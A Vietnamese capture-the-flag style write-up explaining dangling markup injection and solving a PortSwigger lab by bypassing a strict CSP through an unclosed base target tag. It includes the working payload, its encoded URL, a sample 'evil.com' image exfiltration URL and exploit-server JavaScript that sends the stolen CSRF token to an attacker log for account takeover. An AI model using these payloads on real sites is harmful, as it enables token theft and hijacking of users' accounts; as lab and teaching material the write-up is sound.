---
title: Dangling Markup Attack

---

---
title: Dangling Markup Attack
tag: Dangling Markup Attack
---

# Introduction
- Là một kỹ thuật khai thác lỗ hổng injection vào web, thường được sử dụng khi các phương pháp XSS truyền thống bị chặn bởi các cơ chế bảo mật như CSP hoặc bộ lọc đầu vào

## Tại sao browser lại nuốt dữ liệu?
- Web browser được thiết kế với tiêu chí khoan dung (error-tolerant). Khi gặp mã HTML bị lỗi (VD: thiếu dấu đóng ngoặc kép) thay vì báo lỗi và dừng hiển thị (như XML) trình duyệt sẽ cố gắng sửa lỗi để hiển thị nội dung tốt nhất có thể cho người dùng
- Cơ chế này hoạt động dựa trên state machine của trình phân tích cú pháp (HTML Parser). Khi trình duyệt gặp một thuộc tính mở (VD: `<img src="`), nó chuyển sang trạng thái `Attribute Value Double Quoted State`
    - Trình duyệt sẽ tiếp tục đọc mọi ký tự tiếp theo dưới dạng giá trị của thuộc tính cho đến khi nó tìm thấy dấu ngoặc kép đóng (`"`) tương ứng
    - Nó bỏ qua các dấu xuống dòng, các thẻ HTML khác, và cả các dữ liệu nhạy cảm nằm giữa thẻ mở của attacker và dấu ngoặc kép tiếp theo trong trang web => **Dangling Markup**

## Dangling Markup với CSP
- Trong XSS thông thường thì attacker thực thi mã JS (VD: `<script>alert(1)</script>`). Nhưng nếu CSP chặn việc thực thi script hoặc chặn tải tài nguyên từ tên miền bên ngoài, XSS truyền thống sẽ vô hiệu
- Dangling Markup giải quyết vấn đề này bằng cách inject một tag HTML không đóng -> unclosed tag
-  Dangling Markup không thực thi mã. Nó biến cấu trúc DOM của trang web (bao gồm `CSRF token`, thông tin cá nhân) thành dữ liệu (VD: một phần của URL ảnh hoặc tên window). 
-  Vì đây là hành vi phân tích cú pháp HTML hợp lệ, CSP (vốn chỉ quản lý việc tải tài nguyên) thường không chặn được quá trình nuốt dữ liệu này.
- Việc không đóng tag khiến browser nuốt toàn bộ nội dung HTML phía sau điểm injection (cho đến khi gặp ký tự kết thúc phù hợp) và coi đấy là một phần của thuộc tính trong tag độc hại

# Case study (Được thực hiện trên Firefox)

[Reflected XSS protected by very strict CSP, with dangling markup attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)
**Lấy CSRF Token để đổi email người dùng**

## Recon: Phân tích CSP
- Khi kiểm tra HTTP response header cảu bài lab, ta thấy CSP rất chặt chẽ
![image](https://hackmd.io/_uploads/Skw5pbKL-x.png)
    - `script-src 'self' 'nonce-...'`: chặn hoàn toàn thẻ `<script>` nếu không có nonce đúng. XSS truyền thống vô hiệu
    - `img-src 'self'`: đây là điểm mấu chốt. Kỹ thuật Dangling Markup cơ bản thường dùng thẻ `<img>` (VD: `<img src='http://evil.com?log=...`). Tuy nhiên directive này bắt buộc ảnh chỉ được tải từ chính domain của trang web (`'self'`). Nếu ta inject thẻ `<img>` trỏ về server của attacker, trình duyệt sẽ chặn request ngay lập tức -> không lấy được dữ liệu
    
Lỗ hổng trong CSP: chính sách trên thiếu directive `base-uri`. Điều này cho phép kẻ tấn công điều khiển thẻ `<base>`, thẻ này quy định URL gốc cho tất cả các liên kết tương đối và target (cửa sổ đích) của các liên kết

## Điểm injection và dữ liệu mục tiêu
- Điểm injection: chức năng `Update Email` hiển thị lại email cũ trên URL và trong thẻ input ![image](https://hackmd.io/_uploads/rJ6R0ZYU-e.png)
    - URL: `https://0a8f008e04bc672d85eb4a97005600ea.web-security-academy.net/my-account?id=wiener&email=injection_point`
    - HTML response: `<input type="text" name="email" value="injection_point">` ![image](https://hackmd.io/_uploads/B1hEyGKUbl.png)
- Dữ liệu nhạy cảm: token chống CSRF nằm ngay sau điểm injection ![image](https://hackmd.io/_uploads/r1vqJGKUWe.png)
```htmlembedded!
<form action="/my-account/change-email" method="POST">
    <input type="text" name="email" value=""> <!-- injection ở đây -->
    <input required type="hidden" name="csrf" value="SECRET_TOKEN"> <!-- Mục tiêu -->

```

=> Ta cần nuốt toàn bộ đoạn mã từ sau thẻ email đến hết thẻ csrf token

# Exploit
- Do `img-src` bị chặn, ta sẽ sử dụng kỹ thuật Dangling Markup qua thẻ `<base>` kết hợp với `window.name`

## Tạo payload
- Mục tiêu là chèn một thẻ `<base target='`. Thuộc tính `target` quy định tên của cửa sổ (`window name`) khi người dùng nhấn vào `link`. Nếu ta không đóng ngoặc toàn bộ nội dung HTML phía sau sẽ trở thành tên của cửa sổ mới

```htmlembedded!
"><a href="[https://exploit_server.net/exploit](https://exploit_server.net/exploit)">Click Me</a><base target="
```
- `">`: đóng thẻ `<input>` và thuộc tính `value` hiện tại của victim để thoát ra ngoài
- `<a href="...">Click Me</a>`: tTạo mồi nhử, vì ta không thể dùng script để tự động chuyển trang hay dùng ảnh để tự động tải, ta cần người dùng tương tác (click).
- `<base target="`: bắt đầu tấn công Dangling. Dấu ngoặc kép mở sẽ nuốt mọi thứ phía sau cho đến khi gặp dấu ngoặc kép tiếp theo trong trang web gốc

## Data flow khi payload được kích hoạt
- Khi victim truy cập URL chứa payload:
`https://lab_id.web-security-academy.net/my-account?id=wiener&email=%22%3E%3Ca%20href%3D%22https%3A%2F%2Fexploit_server.net%2Fexploit%22%3EClick%20Me%3C%2Fa%3E%3Cbase%20target%3D%22`
(Ta có thể dùng Decoder trong Burp Suite để decode payload) ![image](https://hackmd.io/_uploads/By0bGfYL-g.png)

- Browser sẽ hiểu DOM như sau:
```htmlembedded!
    <input ... value="">
    <a href="[https://exploit_server.net/exploit](https://exploit_server.net/exploit)">Click Me</a>
    <base target=">
        <input required type='hidden' name='csrf' value='TOKEN'>
        <button ...> ... </form> ...
    ">
```

- Toàn bộ đoạn mã từ `> <input ... value='` trở thành giá trị của thuộc tính `target`
- Giá trị này chứa `TOKEN`

## Lấy dữ liệu tại server attacker
- Khi victim nhấn `Click me`
    - Trình duyệt mở link `https://exploit_server.net/exploit` trong một cửa sổ mới.
    - Trình duyệt đặt tên cho cửa sổ mới (`window.name`) bằng chuỗi HTML đã bị nuốt ở trên.
    - Tại exploit server ta dùng JS để đọc`window.name` và gửi về log

Code tại exploit server (File`/exploit`)
```htmlembedded
<body>
<script>
    // window.name chứa CSRF token bị rò rỉ
    // Gửi nó về log của attacker
    fetch('/log?leak=' + encodeURIComponent(window.name));
</script>
</body>
```

## Account takeover
- Lấy token: kiểm tra Access Log của exploit server, giải mã URL để tìm chuỗi `name='csrf' value='victim_token'`
- Tạo CSRF Exploit: Sau khi có token, kẻ tấn công tạo một trang web độc hại thứ hai (hoặc sửa lại trang exploit cũ) để tự động đổi email của nạn nhân